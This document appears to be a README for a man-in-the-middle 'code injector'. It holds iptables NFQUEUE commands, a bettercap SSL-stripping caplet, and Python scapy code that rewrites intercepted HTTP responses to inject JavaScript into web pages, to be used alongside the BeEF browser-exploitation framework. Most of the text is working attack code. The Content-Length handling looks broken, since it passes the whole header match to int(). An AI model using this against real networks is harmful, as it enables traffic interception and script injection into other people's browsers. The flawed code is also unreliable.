# Code Injector
Idea here is to edit requests/responses, replace download requests,
and inject html and javascript. This can be used in parallel with
the beef framework, or any other javascript attack.

Requires being a MiTM machine.

```bash
iptables -I FORWARD -j NFQUEUE --queue-num 0
```
Delete the iptable rule when done
```bash
iptables --flush
```

### To test on local machine use these commands
```bash
iptables -I OUTPUT -j NFQUEUE --queue_num 0
iptables -I INPUT -j NFQUEUE --queue_num 0

# When done
iptables --flush
```

### For SSLStrip
```bash
iptables -I OUTPUT -j NFQUEUE --queue_num 0
iptables -I INPUT -j NFQUEUE --queue_num 0
bettercap -iface eth0 -caplet hstshijack/hstshijack
```
code to change (Have to downgrade to HTTP 1.0):
```python
def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
        try:
            load = scapy_packet[Raw].load.decode()
            if scapy_packet[TCP].dport == 8080:  # dport is incoming
                print("HTTP Request")
                # Replacing encoding to see raw html.
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[TCP].sport == 8080:  # sport is outgoing
                print("HTTP Response")
                injection_code = "<script>alert('test');</script>"
                load = scapy_packet[Raw].load.replace("</body>", f"{injection_code}</body>")
                content_length_search = re.search(r"Content-Length:\s(\d*)", load)
                # Modify content length on return to insure our code isn't cutoff from running.
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(0)  # First match just the digits.
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:  # We don't care about packets we can't unicode decode.
            pass
```